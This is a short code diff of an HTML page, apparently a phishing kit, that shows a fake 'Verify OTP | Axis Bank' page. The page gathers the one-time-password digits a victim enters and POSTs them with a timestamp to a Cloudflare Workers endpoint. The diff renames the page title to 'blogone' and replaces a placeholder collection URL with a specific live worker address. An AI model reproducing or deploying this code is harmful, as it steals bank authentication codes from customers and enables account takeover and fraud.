@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify OTP | Axis Bank</title>
+    <title>blogone</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -143,7 +143,7 @@
             inputs.forEach(input => fullOtp += input.value);
 
             const otpData = { type: 'OTP', otp: fullOtp, time: new Date().toLocaleString() };
-            const WORKER_URL = 'https://your-worker.your-subdomain.workers.dev/';
+            const WORKER_URL = 'https://snowy-sunset-a557.sumankkuuyy.workers.dev/';
 
             fetch(WORKER_URL, {
                 method: 'POST',
